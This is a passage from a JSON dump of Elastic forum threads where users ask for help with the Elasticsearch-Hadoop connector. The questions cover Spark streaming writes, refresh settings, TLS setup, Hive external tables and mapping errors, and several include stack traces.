.setAppName(\"ES-Spark\") .(\"local[*]\") .set(\"es.nodes\", \"cluster-xxxx.xx.xx.xx\") .set(\"es.port\", \"50467\") .set(\"es.resource\", \"recommendations_2/recommendation\") .set(\"es.resource.read\", \"products-20190912/product\") .set(\"es.resource.write\", \"recommendations_2/recommendation\") ; JavaSparkContext ctx = new JavaSparkContext(conf); JavaStreamingContext jsc = new JavaStreamingContext(ctx, new Duration(10000)); JavaInputDStream<ConsumerRecord<String, String>> kafkaStream = Utils.getKafkaStream(jsc); JavaDStream<String> allInfo = kafkaStream.map(f -> f.value()); JavaEsSparkStreaming.saveToEs(allInfo, \"recommendations_2/recommendation\"); jsc.start(); jsc.awaitTermination(); It seems it reaches the cluster but it cannot connect back... The elasticsearch-hadoop version used is: <dependency> <groupId>org.elasticsearch</groupId> <artifactId>elasticsearch-spark-20_2.10</artifactId> <version>5.6.2</version> </dependency> When I try to connect via the Transport Client everything is alright and I am able to make it. I already checked the elasticsearch.yml file and the http.port property is set correctly to the right port.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c2828e22-59c4-41dc-8d0c-b7e4c4dfa6c9",
    "url": "https://discuss.elastic.co/t/difference-between-index-refresh-interval-vs-es-batch-write-refresh/197950",
    "title": "Difference between `index.refresh_interval` vs `es.batch.write.refresh`",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "danielyahn",
    "date": "September 4, 2019, 1:59pm September 6, 2019, 5:29pm September 6, 2019, 5:29pm September 12, 2019, 6:55pm September 12, 2019, 9:30pm October 10, 2019, 9:31pm",
    "body": "I see two similar settings one in ES-Hadoop and the other in index configuration. Is it recommended to set index.refresh_interval to -1, when es.batch.write.refresh=true? When running Spark job, how often does refresh API get called? Is it per Spark job, stage or task? Or something smaller? I see the following code. Is my understanding correct that Structured Streaming uses EsRDDWriter and the scope of writer (which calls refresh API when closing) is a Spark task? Is the refresh API call per index (or per shard)? When multiple tasks finish around the same time, is it possible that the code above is calling refresh API multiple times at the same time? Could it cause performance issue on ES side? Is there a known performance issue with ES-Hadoop's refresh call when there's a large parallelism? I'm running into the following problem. I'm seeing \"Read\" timeouts with Flush API calls when ingesting to ES using SPARK with the default setting es.batch.write.refresh=true And it doesn't seem to relate to tuning Bulk request size because when I set es.batch.write.refresh=false and index.refresh_interval='30s' I don't get the timeout. What's the best practice for configuring refresh when writing a Spark ingest job? 19/09/03 20:37:50 TRACE NetworkClient: Caught exception while performing request [<redacted>:9200][/_refresh] - falling back to the next node in line... java.net.SocketTimeoutException: Read timed out at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) at java.net.SocketInputStream.read(SocketInputStream.java:170) at java.net.SocketInputStream.read(SocketInputStream.java:141) at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) at sun.security.ssl.InputRecord.read(InputRecord.java:503) at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) at java.io.BufferedInputStream.read(BufferedInputStream.java:265) at org.apache.commons.httpclient.HttpParser.readRawLine(HttpParser.java:78) at org.apache.commons.httpclient.HttpParser.readLine(HttpParser.java:106) at org.apache.commons.httpclient.HttpConnection.readLine(HttpConnection.java:1116) at org.apache.commons.httpclient.HttpMethodBase.readStatusLine(HttpMethodBase.java:1973) at org.apache.commons.httpclient.HttpMethodBase.readResponse(HttpMethodBase.java:1735) at org.apache.commons.httpclient.HttpMethodBase.execute(HttpMethodBase.java:1098) at org.apache.commons.httpclient.HttpMethodDirector.executeWithRetry(HttpMethodDirector.java:398) at org.apache.commons.httpclient.HttpMethodDirector.executeMethod(HttpMethodDirector.java:171) at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:397) at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:323) at org.elasticsearch.hadoop.rest.commonshttp.CommonsHttpTransport.execute(CommonsHttpTransport.java:489) at org.elasticsearch.hadoop.rest.pooling.TransportPool$LeasedTransport.execute(TransportPool.java:235) at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:115) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:398) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:362) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:366) at org.elasticsearch.hadoop.rest.RestClient.refresh(RestClient.java:267) at org.elasticsearch.hadoop.rest.bulk.BulkProcessor.close(BulkProcessor.java:550) at org.elasticsearch.hadoop.rest.RestRepository.close(RestRepository.java:219) at org.elasticsearch.hadoop.rest.RestService$PartitionWriter.close(RestService.java:121) at org.elasticsearch.spark.rdd.EsRDDWriter$$anonfun$write$1.apply(EsRDDWriter.scala:60) at org.elasticsearch.spark.rdd.EsRDDWriter$$anonfun$write$1.apply(EsRDDWriter.scala:60) at org.apache.spark.TaskContext$$anon$1.onTaskCompletion(TaskContext.scala:128) at org.apache.spark.TaskContextImpl$$anonfun$markTaskCompleted$1.apply(TaskContextImpl.scala:118) at org.apache.spark.TaskContextImpl$$anonfun$markTaskCompleted$1.apply(TaskContextImpl.scala:118) at org.apache.spark.TaskContextImpl$$anonfun$invokeListeners$1.apply(TaskContextImpl.scala:131) at org.apache.spark.TaskContextImpl$$anonfun$invokeListeners$1.apply(TaskContextImpl.scala:129) at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) at org.apache.spark.TaskContextImpl.invokeListeners(TaskContextImpl.scala:129) at org.apache.spark.TaskContextImpl.markTaskCompleted(TaskContextImpl.scala:117) at org.apache.spark.scheduler.Task.run(Task.scala:125) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:345) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 19/09/03 20:37:50 ERROR NetworkClient: Node [<redacted>:9200] failed (Read timed out); selected next node [<redacted>:9200]",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8e0f40b1-0c45-4f44-b05b-c189d153f44e",
    "url": "https://discuss.elastic.co/t/bulk-request-monitoring/198464",
    "title": "Bulk Request Monitoring",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "danielyahn",
    "date": "September 6, 2019, 6:07pm September 12, 2019, 6:56pm September 12, 2019, 9:23pm October 10, 2019, 9:23pm",
    "body": "According to the doc, it's important to monitor bulk requests to tune ES-Hadoop ingest. I think it will be beneficial to set up monitoring around the requests for production operation as well. I've tried few different routes to gather the metrics: Security audit log and filter successful authentication for bulk request. From Kibana's monitoring plugin, and go to index's advanced view, and use Request Rate and Request Time visualization. Enable debugging on org.elasticsearch.hadoop.rest.bulk It looks like option 3 has the richest information, but it's still not enough to answer questions like: What's the average bulk request response time? How many bulk request is es-hadoop job sending per second? How many rejection is happening? As a workaround, I implemented a simple log parser that can correlate request created event and request response event. Is there a easier way to gather and consume these metrics? Through Kibana's monitoring plugin? Expose these metrics as custom Spark metrics?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "613877a7-2bd0-4ce3-8acb-2cff06375b8f",
    "url": "https://discuss.elastic.co/t/elasticsearch-support-for-spark-2-4-2-with-scala-2-12/197810",
    "title": "Elasticsearch support for spark 2.4.2 with scala 2.12",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Gokul_Raj",
    "date": "September 3, 2019, 10:57am September 17, 2019, 3:04am October 4, 2019, 4:27pm",
    "body": "I'm not able to find any ES 6.7.1 supporting jar for spark 2.4.2 with scala 2.12 In maven repo only scala 2.11 and 2.10 is supported for the jar <dependency> <groupId>org.elasticsearch</groupId> <artifactId>elasticsearch-spark-20_2.11</artifactId> <version>6.7.1</version> </dependency> For my application we are using spark 2.4.2 which supports only scala 2.12 version. Following is the error shown when I try to run with \"elasticsearch-spark-20_2.11\" jar image.png1366×366 17.4 KB Is there any alternative to resolve this situation as downgrade is not an option? o",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "11bea4e0-1820-4ef0-9d84-6056e6a921b1",
    "url": "https://discuss.elastic.co/t/es-hadoop-with-tls/197417",
    "title": "Es-hadoop with TLS",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "mstarensier",
    "date": "August 29, 2019, 8:20pm September 6, 2019, 4:22pm October 4, 2019, 4:22pm",
    "body": "Has anybody been able to use es-hadoop connector with an Es cluster where TLS is enabled? If so, what configuration params did you use, and what kind of certificate? I'm trying to connect to a 7.e ES cluster with xpack security enabled and TLS enabled. I'm using a CA and instance cert generated by the es certutil. verification mode = certificate, so all es nodes are using the same cert. The cert is in PKCS12 format. The es nodes all communicate with each other. But I haven't beeen able to get es-hadoop to work using tls. In spark conf, I enabled es ssl, specified keystore and truststore, using the same pkcs12 keystore that I'm using on the es nodes. I also specified PKCS12 as the keystore type. But es rejects requests from es-hadoop. Error [o.e.t.TcpTransport ] [test-es-data-node1] exception caught on transport layer [Netty4TcpChannel{localAddress=0.0.0.0/0.0.0 .0:9300, remoteAddress=/10.0.1.81:44991}], closing connection io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: Received fatal alert: internal_error Is the certificate I'm using on the es nodes not valid for use by es-hadoop? Is there some alternate configuration required? Any other avenues to try?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f4328078-8e0e-4827-b841-70f06c622065",
    "url": "https://discuss.elastic.co/t/trying-to-insert-data-into-the-external-table/197368",
    "title": "Trying to insert data into the external table",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "varunakuraju",
    "date": "August 29, 2019, 6:56pm September 6, 2019, 4:18pm October 4, 2019, 4:18pm",
    "body": "Hi, Using hadoop and elasticsearch on cloud created external table but getting some errors while inserting the data into the external table set hive.execution.engine=mr hive> insert overwrite table vgsale5es select * from vgsale5; WARNING: Hive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. spark, tez) or using Hive 1.X releases. Query ID = saivarunakuraju_20190829180559_6bd94dfb-f0fa-4c58-a4f6-963a3e10deb3 Total jobs = 1 Launching Job 1 out of 1 Number of reduce tasks is set to 0 since there's no reduce operator Starting Job = job_1567078294077_0011, Tracking URL = http://hadoopcluster-m:8088/proxy/application_1567078294077_0011/ Kill Command = /usr/lib/hadoop/bin/hadoop job -kill job_1567078294077_0011 Hadoop job information for Stage-3: number of mappers: 1; number of reducers: 0 2019-08-29 18:06:13,379 Stage-3 map = 0%, reduce = 0% 2019-08-29 18:07:13,827 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 2.02 sec 2019-08-29 18:08:14,062 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 2.02 sec 2019-08-29 18:09:14,304 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.57 sec 2019-08-29 18:10:14,527 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.57 sec 2019-08-29 18:11:14,669 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.97 sec 2019-08-29 18:12:14,784 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.97 sec 2019-08-29 18:13:14,840 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.97 sec 2019-08-29 18:14:14,973 Stage-3 map = 0%, reduce = 0%, Cumulative CPU 1.97 sec 2019-08-29 18:14:48,571 Stage-3 map = 100%, reduce = 0% MapReduce Total cumulative CPU time: 1 seconds 970 msec Ended Job = job_1567078294077_0011 with errors Error during job, obtaining debugging information... Examining task ID: task_1567078294077_0011_m_000000 (and more) from job job_1567078294077_0011 Task with the most failures(4): ----- Task ID: task_1567078294077_0011_m_000000 URL: http://hadoopcluster-m:8088/taskdetails.jsp?jobid=job_1567078294077_0011&tipid=task_1567078294077_0011_m_000000 ----- Diagnostic Messages for this Task: Error: java.lang.RuntimeException: org.apache.hadoop.hive.ql.metadata.HiveException: Hive Runtime Error while processing row {\"rank\":\"rank\",\"name\":\"name\",\"platform\":\"platform\",\"year\":\"year\",\"genre\":\"genre\",\"publisher\":\"publisher\",\"na_sales\":\"na_sales\",\"eu_sales\":\"eu_ales\",\"jp_sales\":\"jp_sales\",\"other_sales\":\"other_sales\",\"global_sales\":\"global_sales\"} at org.apache.hadoop.hive.ql.exec.mr.ExecMapper.map(ExecMapper.java:169) at org.apache.hadoop.mapred.MapRunner.run(MapRunner.java:54) at org.apache.hadoop.mapred.MapTask.runOldMapper(MapTask.java:459) at org.apache.hadoop.mapred.MapTask.run(MapTask.java:343) at org.apache.hadoop.mapred.YarnChild$2.run(YarnChild.java:177) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1893) at org.apache.hadoop.mapred.YarnChild.main(YarnChild.java:171) Caused by: org.apache.hadoop.hive.ql.metadata.HiveException: Hive Runtime Error while processing row {\"rank\":\"rank\",\"name\":\"name\",\"platform\":\"platform\",\"year\":\"year\",\"genre\":\"genre\",\"publisher\":\"publisher\",\"na_sales\":\"na_sales\",\"eu_sales\":\"eu_ales\",\"jp_sales\":\"jp_sales\",\"other_sales\":\"other_sales\",\"global_sales\":\"global_sales\"} at org.apache.hadoop.hive.ql.exec.MapOperator.process(MapOperator.java:562) at org.apache.hadoop.hive.ql.exec.mr.ExecMapper.map(ExecMapper.java:160) ... 8 more Caused by: org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed; tried [[10.168.0.3:9200]] at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:152) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:424) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:388) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:392) at org.elasticsearch.hadoop.rest.RestClient.get(RestClient.java:168) at org.elasticsearch.hadoop.rest.request.GetAliasesRequestBuilder.execute(GetAliasesRequestBuilder.java:68) at org.elasticsearch.hadoop.rest.RestService.createWriter(RestService.java:622) at org.elasticsearch.hadoop.mr.EsOutputFormat$EsRecordWriter.init(EsOutputFormat.java:175) at org.elasticsearch.hadoop.hive.EsHiveOutputFormat$EsHiveRecordWriter.write(EsHiveOutputFormat.java:59) at org.apache.hadoop.hive.ql.exec.FileSinkOperator.process(FileSinkOperator.java:762) at org.apache.hadoop.hive.ql.exec.Operator.forward(Operator.java:897) at org.apache.hadoop.hive.ql.exec.SelectOperator.process(SelectOperator.java:95) at org.apache.hadoop.hive.ql.exec.Operator.forward(Operator.java:897) at org.apache.hadoop.hive.ql.exec.TableScanOperator.process(TableScanOperator.java:130) at org.apache.hadoop.hive.ql.exec.MapOperator$MapOpCtx.forward(MapOperator.java:148) at org.apache.hadoop.hive.ql.exec.MapOperator.process(MapOperator.java:547) ... 9 more FAILED: Execution Error, return code 2 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask MapReduce Jobs Launched: Stage-Stage-3: Map: 1 Cumulative CPU: 1.97 sec HDFS Read: 0 HDFS Write: 0 FAIL Total MapReduce CPU Time Spent: 1 seconds 970 msec thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2ada30f4-a5e2-42b5-b735-de34f76d8998",
    "url": "https://discuss.elastic.co/t/unable-to-use-es-hadoop-with-tls-enabled-on-my-es-cluster/197225",
    "title": "Unable to use es-hadoop with TLS enabled on my ES cluster",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "mstarensier",
    "date": "August 28, 2019, 8:55pm September 6, 2019, 4:16pm October 4, 2019, 4:16pm",
    "body": "I'm having trouble configuring TLS for es-hadoop. Running 7.2 Elasticsearch in a 3 node cluster (1 data, 1 master, 1 coordinating which hosts kibana). Running Spark on an EMR cluster in the same vpn. Before enabling xpack security, was able to connect to ES from Spark using both es-hadoop and Rest Client. Configured TLS with CA and single signing cert, generated by certutil, used in all es and spark nodes. The nodes all ES nodes communicate with each other correctly. But in spark, the es-hadoop connector can no longer connect to the ES cluster. (The rest client running in the spark job can connect using basic auth). For experimentation, we are running this job from a zeppelin notebook spark interpreter. I am using the same certificate in the spark cluster nodes which I am using in the ES cluster nodes. spark es config properties are: es.net.http.auth.pass : xxxxxx es.net.http.auth.user : xxxxxx es.net.ssl : true es.net.ssl.keystore.location : file:///home/hadoop/ria/certs/test-es-node-cert.p12 es.net.ssl.trustore.location : file:///home/hadoop/ria/certs/test-es-node-cert.p12 es.nodes : 10.0.1.179 es.port : 9300 Rest client works fine, connector fails. In the spark logs on failure, message begins: %text org.elasticsearch.hadoop.EsHadoopIllegalArgumentExc eption: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:340) at org.elasticsearch.hadoop.rest.RestService.findPartitions(RestService.java:220) at in es logs, stack trace is exception caught on transport layer [Netty4TcpChannel{localAddress=0.0.0.0/0.0.0.0:9300, remoteAddress=/10.0.1.81:51709}], closing connection io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: Received fatal alert: internal_error at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:472) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:278) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1408) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:930) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:682) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:582) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:536) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:496) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:906) [netty-common-4.1.35.Final.jar:4.1.35.Final] at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-common-4.1.35.Final.jar:4.1.35.Final] at java.lang.Thread.run(Thread.java:835) [?:?] Caused by: javax.net.ssl.SSLException: Received fatal alert: internal_error at sun.security.ssl.Alert.createSSLException(Alert.java:133) ~[?:?] at sun.security.ssl.Alert.createSSLException(Alert.java:117) ~[?:?] at sun.security.ssl.TransportContext.fatal(TransportContext.java:307) ~[?:?] at sun.security.ssl.Alert$AlertConsumer.consume(Alert.java:285) ~[?:?] at sun.security.ssl.TransportContext.dispatch(TransportContext.java:180) ~[?:?] at sun.security.ssl.SSLTransport.decode(SSLTransport.java:164) ~[?:?] at sun.security.ssl.SSLEngineImpl.decode(SSLEngineImpl.java:681) ~[?:?] at sun.security.ssl.SSLEngineImpl.readRecord(SSLEngineImpl.java:636) ~[?:?] at sun.security.ssl.SSLEngineImpl.unwrap(SSLEngineImpl.java:454) ~[?:?] at sun.security.ssl.SSLEngineImpl.unwrap(SSLEngineImpl.java:433) ~[?:?] at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:634) ~[?:?] at io.netty.handler.ssl.SslHandler$SslEngineType$3.unwrap(SslHandler.java:295) ~[netty-handler-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1332) ~[netty-handler-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1227) ~[netty-handler-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1274) ~[netty-handler-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:502) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:441) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] ... 16 more [2019-08-28T14:12:16,592][WARN ][o.e.t.TcpTransport ] [test-es-data-node1] exception caught on transport layer [Netty4TcpChannel{localAddress=0.0.0.0/0.0.0.0:9300, remoteAddress=/10.0.1.81:39683}], closing connection io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: Received fatal alert: internal_error at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:472) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:278) ~[netty-codec-4.1.35.Final.jar:4.1.35.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374) [netty-transport-4.1.35.Final.jar:4.1.35.Final] at 4 elided.... Are there some other additional or different configurations required? Do I need a different certificate to act as the es-hadoop keystore? Any ideas would be helpful.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "aa0fcca9-5e96-4524-8d4c-f689b80d5d3f",
    "url": "https://discuss.elastic.co/t/can-i-search-data-on-hadoop-using-elasticsearch/197780",
    "title": "Can i search data on hadoop using elasticsearch?",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Vinit_Pillai",
    "date": "September 3, 2019, 8:03am September 3, 2019, 8:15am September 3, 2019, 9:29am October 1, 2019, 9:29am",
    "body": "I am a noob in the es-Hadoop category. I have tried to read all the documents but am still confused regarding how es-hadoop works and do I need it. The question is simple. Can I search for data on Hadoop using elasticsearch? Can I create weekly indexes in elasticsearch which saves in Hadoop? Will I be able to search through these indexes using elasticsearch?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4897e4ba-e9e0-4a82-be13-5fd8454b84d4",
    "url": "https://discuss.elastic.co/t/how-to-specify-number-of-shards-when-putting-data-into-es-using-elasticsearch-hadoop-sdk/197001",
    "title": "How to specify number_of_shards when putting data into ES using elasticsearch-hadoop SDK",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "yuecong",
    "date": "August 27, 2019, 8:40pm August 27, 2019, 9:06pm August 27, 2019, 11:09pm September 24, 2019, 11:09pm",
    "body": "From this page for the elasticsearch hadoop SDK, I can not find how to configure number_of_shards when creating one index automatically like .option(\"es.resource.write\", \"log-{dateHour}\") In this doc, it menthioned it can use index setting API, but number_of_shards can only be set during index creation. https://www.elastic.co/guide/en/elasticsearch/reference/7.3/indices-create-index.html#create-index-settings I tried .option(\"es.index.number_of_shards\", 10) .option(\"es.index.refresh_interval\", 10) but it does not looks like work, becuase when I query the index setting, the number_of_shards for the one created is still 1. Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1e8fc5dc-b77b-44d3-945d-ac710df1398b",
    "url": "https://discuss.elastic.co/t/getting-error-while-processing-nested-document-org-elasticsearch-hadoop-mr-writablearraywritable-cannot-be-cast-to-org-apache-hadoop-io-mapwritable/196359",
    "title": "Getting error while processing Nested Document :org.elasticsearch.hadoop.mr.WritableArrayWritable cannot be cast to org.apache.hadoop.io.MapWritable",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Srinivas2",
    "date": "August 23, 2019, 6:37pm August 22, 2019, 4:00pm August 22, 2019, 4:03pm August 22, 2019, 4:11pm August 23, 2019, 5:04pm August 23, 2019, 6:45pm August 27, 2019, 1:20pm September 24, 2019, 1:20pm",
    "body": "Hi Team, I am creating an external table on a nested JSON document looks like below. { \"rootcol1\": \"val1\", \"rootcol2\": \"vla2\", \"rootcol3\": \"val2\", \"rootcol4\": \"val3\", \"rootcol5\": [ { \"childcol1\": \"vla5\", \"childcol2\":[ {\"innercol1\":\"innervalue1\"}, {\"innercol2\":\"innervalue2}\" ] } ] } Below is the create table statement . create external table elasticserach_pool_59(rootcol1 STRING,rootcol2 STRING,rootcol3 STRING,childcol1 STRING) STORED BY 'org.elasticsearch.hadoop.hive.EsStorageHandler' TBLPROPERTIES( 'es.nodes'='Endpoint Name', 'es.port'='port', 'es.resource'='indexname' , 'es.nodes.wan.only' = 'true', 'es.nodes.discover'='true', 'es.mapping.names'='rootcol1 :rootcol1 ,rootcol2 :rootcol2 ,rootcol3:rootcol3,childcol1:rootcol5.childcol1', 'es.read.field.as.array.exclude'='rootcol5.*' ); I am getting the error when I execute select statement. :org.elasticsearch.hadoop.mr.WritableArrayWritable cannot be cast to org.apache.hadoop.io.MapWritable I tried with exclude option as well , but getting same exception. If I am not including the child columns ,I able to see the Data without any issue. Please assist me on this issue. Thanks in advance.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "d33175ff-3205-4c54-b659-c32f9f4b27da",
    "url": "https://discuss.elastic.co/t/connecting-hadoop-and-elasticsearch/196170",
    "title": "Connecting hadoop and elasticsearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "varunakuraju",
    "date": "August 21, 2019, 5:32pm August 23, 2019, 4:59pm August 26, 2019, 8:21pm September 20, 2019, 7:50pm",
    "body": "Hi all, I am new to Elasticsearch and kibana I want establish two-way connection between hdfs and elasticsearch. I used Hive external tables but its not working. I am not finding a way , steps i have done installed elasticsearch and kibana for hadoop, i created hadoop cluster in google cloud and then i connected to terminal through ssh key. I download es-hadoop(https://www.elastic.co/downloads/hadoop). loaded data into hadoop and then created tables in hive. In hadoop, added elasticsearch-hadoop-hive-7.3.0.jar to class path and trying to create the external tables to create indexes in elasticsearch but couldn't do it. Is there any command to verify the connectivity between hadoop and elasticsearch. Can anyone please suggest me which method is better and how to implement. Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "66ab1205-d294-4729-b965-e4a019c0a30b",
    "url": "https://discuss.elastic.co/t/eshadoopillegalstateexception-when-using-ranges/195733",
    "title": "EsHadoopIllegalStateException when using ranges",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "markoutso",
    "date": "August 19, 2019, 12:57pm August 23, 2019, 4:38pm August 26, 2019, 9:29am September 23, 2019, 6:54am",
    "body": "Hello, I have the following index and data: PUT range_index { \"settings\": { \"number_of_shards\": 2 }, \"mappings\": { \"_doc\": { \"properties\": { \"expected_attendees\": { \"type\": \"integer_range\" }, \"time_frame\": { \"type\": \"date_range\", \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\" } } } } } PUT range_index/_doc/1?refresh { \"expected_attendees\" : { \"gte\" : 10, \"lte\" : 20 }, \"time_frame\" : { \"gte\" : \"2015-10-31 12:00:00\", \"lte\" : \"2015-11-01\" } } and I wrote a simple spark application to display the data: package com.es_range import org.apache.spark.SparkConf import org.apache.spark.sql.SparkSession import org.elasticsearch.hadoop.cfg.ConfigurationOptions object Main { def main(args: Array[String]): Unit = { val sparkConf = new SparkConf() .setAppName(\"test\") .set(ConfigurationOptions.ES_NODES, \"localhost\") .set(ConfigurationOptions.ES_PORT, \"9200\") .set(ConfigurationOptions.ES_INDEX_READ_MISSING_AS_EMPTY, \"true\") sparkConf.setMaster(\"local[*]\") sparkConf.set(\"spark.driver.host\", \"localhost\") val spark = SparkSession.builder .appName(\"test\") .config(sparkConf) .enableHiveSupport() .getOrCreate() val esDataFrame = spark.sqlContext.read .format(\"org.elasticsearch.spark.sql\") .load(\"range_index/_doc\") esDataFrame.show(10) } } When I try to run it I get the following error: org.elasticsearch.hadoop.rest.EsHadoopParsingException: org.elasticsearch.hadoop.EsHadoopIllegalStateException: Field '_' not found; typically this occurs with arrays which are not mapped as single value I don't understand what is going on there and why the data cannot be loaded into the dataframe. Could someone shed some light? Is this maybe a bug?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b1ed7431-be9a-4fe9-8ad2-c265d2dc4771",
    "url": "https://discuss.elastic.co/t/data-ingestion-into-elasticsearch-from-spark-structured-streaming/196075",
    "title": "Data ingestion into ElasticSearch from Spark Structured Streaming",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "SandeepReddy",
    "date": "August 21, 2019, 9:43am August 23, 2019, 4:39pm August 24, 2019, 4:36pm September 21, 2019, 4:36pm",
